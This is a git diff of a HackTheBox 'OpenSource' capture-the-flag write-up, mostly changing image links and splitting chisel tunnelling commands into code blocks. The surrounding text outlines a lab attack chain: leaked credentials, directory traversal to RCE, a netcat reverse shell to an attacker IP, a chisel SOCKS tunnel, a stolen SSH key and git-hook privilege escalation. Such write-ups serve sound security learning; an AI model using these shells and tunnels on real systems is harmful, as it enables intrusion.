@@ -8,8 +8,6 @@ coverY: 0
 
 <figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-HTB: OpenSource
-
 ### Machine Info <a href="#machine-info" id="machine-info"></a>
 
 OpenSource starts from web-app which offers a zip file of source code that includes a Git repository. This leads to credentials leaks. The site also has a directory traversal flaw that allows us to read and write files. So, we’ll overwrite Flask views.py module and get RCE. From there, we will access a private Gitea instance and find an SSH key to gain shell access to the host. With a root-level cron job running Git commands, we can abuse git hooks to gain root access.
@@ -166,9 +164,11 @@ http://source.htb/exec?cmd=nc%2010.10.16.2%20%201337%20-e%20/bin/sh
 nc -nlvp 1337PYTHT
 ```
 
-![Desktop View](http://localhost:1313/opensource/media6.png)
+
 
 ### Container escape <a href="#container-escape" id="container-escape"></a>
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 As you can see, we are in a docker container. However, now that we have access to the machine, we can check the previously found service on port 3000 and find out which service is running on it.
 
@@ -199,13 +199,27 @@ $ cat index.html
 
 We see that the local `Gitea` service is running, but it’s available only from browser, so we can use `chisel` to make a port forwarding on our local machine.
 
-**Victim:** `./chisel_1.7.7_linux_amd64 client 10.10.16.2:3000 R:5000:socks` **Attacker:** `./chisel_1.7.7_linux_amd64 server --port 3000 -v --reverse --socks5`
+**Victim:**
 
-After the connection is established, you must also set the proxy in the browser settings on the previously specified port (5000).
+```bash
+./chisel_1.7.7_linux_amd64 client 10.10.16.2:3000 R:5000:socks 
+```
 
-![Desktop View](http://localhost:1313/opensource/media7.png)
+**Attacker:**&#x20;
 
-We got access to gitea service, so now we can try that credentials from source code:![Desktop View](http://localhost:1313/opensource/media8.png)![Desktop View](http://localhost:1313/opensource/media9.png)
+```bash
+./chisel_1.7.7_linux_amd64 server --port 3000 -v --reverse --socks5
+```
+
+After the connection is established, you must also set the proxy in the browser settings on the previously specified port (5000):
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+We got access to Gitea service, so now we can try that credentials from source code:
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 As you can see there is a private SSH-key `id_rsa`, that we can use to connect as user on machine:
 
@@ -222,7 +236,9 @@ user.txt
 
 Let’s use `pspy` to see what processes are running on a machine. After some time, I noticed the `/usr/local/bin/git-sync script` runs every few minute.
 
-![Desktop View](http://localhost:1313/opensource/media10.png) ![Desktop View](http://localhost:1313/opensource/media11.png)
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+![Desktop View](http://localhost:1313/opensource/media11.png)
 
 I also noticed that the `git-commit` command making backups every minute, which makes me think about privilege escalation via `git-hooks` .
 
